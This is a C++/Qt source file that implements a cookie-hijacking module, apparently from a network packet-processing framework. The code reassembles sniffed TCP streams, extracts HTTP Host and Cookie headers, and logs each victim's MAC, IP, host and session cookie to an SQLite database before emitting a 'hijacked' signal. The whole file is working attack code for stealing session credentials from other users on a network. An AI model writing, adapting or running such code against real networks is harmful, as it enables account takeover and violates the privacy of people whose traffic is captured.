#include "gcookiehijack.h"

// ----------------------------------------------------------------------------
// GCookieHijack
// ----------------------------------------------------------------------------
bool GCookieHijack::doOpen() {
	if (tcpFlowMgr_ == nullptr) {
		SET_ERR(GErr::ObjectIsNull, "tcpFlowMgr is null");
		return false;
	}
	tcpFlowOffset_ = tcpFlowMgr_->requestItems_.request(this, sizeof(Item));
	tcpFlowMgr_->managables_.insert(this);

	reHost_.setPattern("Host: ([^\\r]*)\\r");
	reCookie_.setPattern("Cookie: ([^\\r]*)\\r");

	static bool first = true;
	if (first) {
		db_ = QSqlDatabase::addDatabase("QSQLITE");
		first = false;
	}

	db_.setDatabaseName(fileName_);
	if (!db_.open()) {
		SET_ERR(GErr::Fail, QString("%1 %2").arg(db_.lastError().text()).arg(fileName_));
		return false;
	}

	QSqlQuery query(db_);
	if (!query.exec(
			"CREATE TABLE IF NOT EXISTS cookie ("
			"	id INTEGER PRIMARY KEY AUTOINCREMENT,"
			"	created INTEGER,"
			"	mac INTEGER,"
			"	ip INTEGER,"
			"	host TEXT,"
			"	cookie TEXT"
			");"
			)) {
		SET_ERR(GErr::Fail, query.lastError().text());
		return false;
	}

	insertQuery_ = new QSqlQuery(db_);
	if (!insertQuery_->prepare("INSERT INTO cookie (created, mac, ip, host, cookie) VALUES (:created, :mac, :ip, :host, :cookie)")) {
		SET_ERR(GErr::Fail, insertQuery_->lastError().text());
		return false;
	}

	return true;
}

bool GCookieHijack::doClose() {
	QMutexLocker ml(this);
	db_.close();

	if (insertQuery_ != nullptr) {
		delete insertQuery_;
		insertQuery_ = nullptr;
	}

	return true;
}

void GCookieHijack::tcpFlowCreated(GFlow::TcpFlowKey tcpFlowKey, GTcpFlowMgr::TcpFlowValue* tcpFlowValue) {
	// qDebug() << QString("_tcpFlowDetected %1").arg(QString(tcpFlowKey)); // gilgil temp 2021.04.07
	(void)tcpFlowKey;
	Item* item = getItem(tcpFlowValue);
	GTcpHdr* tcpHdr = tcpFlowMgr_->currentPacket_->tcpHdr_;
	Q_ASSERT(tcpHdr != nullptr);
	bool synExist = (tcpHdr->flags() & GTcpHdr::Syn) != 0;
	bool finExist = (tcpHdr->flags() & GTcpHdr::Fin) != 0;
	new (item) Item(tcpHdr->seq() + (synExist || finExist ? 1 : 0));
}

void GCookieHijack::tcpFlowDeleted(GFlow::TcpFlowKey tcpFlowKey, GTcpFlowMgr::TcpFlowValue* tcpFlowValue) {
	(void)tcpFlowKey;
	Item* item = getItem(tcpFlowValue);
	item->~Item();
	// qDebug() << QString("_tcpFlowDeleted %1").arg(QString(tcpFlowKey)); // gilgil temp 2021.04.07
}

bool GCookieHijack::extract(QString httpRequest, QString& host, QString& cookie) {
	QRegularExpressionMatch m = reHost_.match(httpRequest);
	if (!m.hasMatch()) return false;
	host = m.captured(1);

	m = reCookie_.match(httpRequest);
	if (!m.hasMatch()) return false;
	cookie = m.captured(1);

	return true;
}

bool GCookieHijack::insert(time_t created, GMac mac, GIp ip, QString host, QString cookie) {
	QMutexLocker ml(this);

	Q_ASSERT(insertQuery_ != nullptr);
	insertQuery_->bindValue(":created", quint64(created));
	insertQuery_->bindValue(":mac", quint64(mac));
	insertQuery_->bindValue(":ip", quint32(ip));
	insertQuery_->bindValue(":host", host);
	insertQuery_->bindValue(":cookie", cookie);

	bool res = insertQuery_->exec();
	if (!res) {
		qWarning() << insertQuery_->lastError().text();
	}
	return res;
}

void GCookieHijack::hijack(GPacket* packet) {
	GIpHdr* ipHdr = packet->ipHdr_;
	if (ipHdr == nullptr) return;

	GTcpHdr* tcpHdr = packet->tcpHdr_;
	if (tcpHdr == nullptr) return;

	GBuf tcpData = packet->tcpData_;
	if (!tcpData.valid()) return;
	QByteArray segment = QByteArray(pchar(tcpData.data_), tcpData.size_);

	Q_ASSERT(tcpFlowMgr_->currentTcpFlowVal_ != nullptr);
	Item* item = getItem(tcpFlowMgr_->currentTcpFlowVal_);
	QString http = item->segment_.insert(tcpHdr->seq(), segment);

	QString host, cookie;
	if (!extract(http, host, cookie))
		return;
	item->segment_.clear();

	time_t created = packet->ts_.tv_sec;
	GMac mac(GMac::nullMac());
	GEthHdr* ethHdr = packet->ethHdr_;
	if (ethHdr != nullptr)
		mac = ethHdr->smac();
	GIp ip = ipHdr->sip();
	insert(created, mac, ip, host, cookie);
	qDebug() << "\n" << host << "\n" << cookie;
	emit hijacked(packet->ts_.tv_sec, mac, ip, host, cookie);
}

#ifdef QT_GUI_LIB

#include "base/prop/gpropitem-filepath.h"
GPropItem* GCookieHijack::propCreateItem(GPropItemParam* param) {
	if (QString(param->mpro_.name()) == "fileName") {
		GPropItemFilePath* res = new GPropItemFilePath(param);
		QStringList filters{"db files - *.db(*.db)", "any files - *(*)"};
		res->fd_->setNameFilters(filters);
		return res;
	}
	return GObj::propCreateItem(param);
}

#endif // QT_GUI_LIB
